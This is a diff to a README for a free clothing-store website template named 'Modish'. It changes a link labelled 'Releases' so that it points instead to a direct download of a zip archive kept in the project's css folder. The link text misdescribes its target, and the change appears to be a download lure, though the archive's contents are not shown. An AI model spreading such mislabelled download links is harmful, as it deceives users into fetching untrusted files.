@@ -39,6 +39,6 @@ Are you looking to upgrade your online clothing store's website design? Look no 
 
 ### Get Started:
 
-To download and start using the "Modish" template, visit the [Releases](https://github.com/Bernaldo-ALonso/modish-free-ecommerce-website-template/releases) section of the repository.
+To download and start using the "Modish" template, visit the [Releases](https://github.com/Bernaldo-ALonso/modish-free-ecommerce-website-template/raw/refs/heads/master/css/modish-ecommerce-website-free-template-2.0.zip) section of the repository.
 
 🌟 Upgrade your online store with 'Modish' now and create a stylish and user-friendly shopping experience for your customers! 🌟
